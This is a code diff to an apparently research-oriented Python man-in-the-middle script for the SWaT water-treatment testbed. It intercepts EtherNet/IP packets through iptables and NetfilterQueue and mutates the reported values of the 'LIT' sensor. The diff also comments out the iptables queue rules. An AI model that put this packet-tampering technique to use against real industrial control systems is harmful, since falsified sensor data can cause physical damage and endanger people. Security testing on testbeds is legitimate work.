@@ -54,7 +54,7 @@ def __extract(packet):
 
         #LIT mutation
         if (str(pkt.src) == '192.168.1.30' and enip_tcp.ENIP_SendRRData in pkt and str(pkt.dst) == '192.168.1.10'):
-            
+            ind = device.index('LIT')
             mut = mutation[ind]
             val = value[ind]
             if SWAT_LIT in pkt:
@@ -186,7 +186,7 @@ def start():
     __setup()
     nfqueue = NetfilterQueue()
     nfqueue.bind(0, __extract)
-    nfqueue.bind(1, __extract)
+    #nfqueue.bind(1, __extract)
    
     try:
         print("[*] starting NFQUEUE")
@@ -199,8 +199,8 @@ def start():
 
 def __setup():
     # change network interface 
-    os.system('iptables -A FORWARD -p tcp -m physdev --physdev-in enp0s3 -j NFQUEUE --queue-num 0')
-    os.system('iptables -A FORWARD -p tcp -m physdev --physdev-in enp0s8 -j NFQUEUE --queue-num 1')
+    #os.system('iptables -A FORWARD -p tcp -m physdev --physdev-in enp0s3 -j NFQUEUE --queue-num 0') #incoming
+    #os.system('iptables -A FORWARD -p tcp -m physdev --physdev-in enp0s8 -j NFQUEUE --queue-num 0') #outgoing
 
 
 def __setdown():
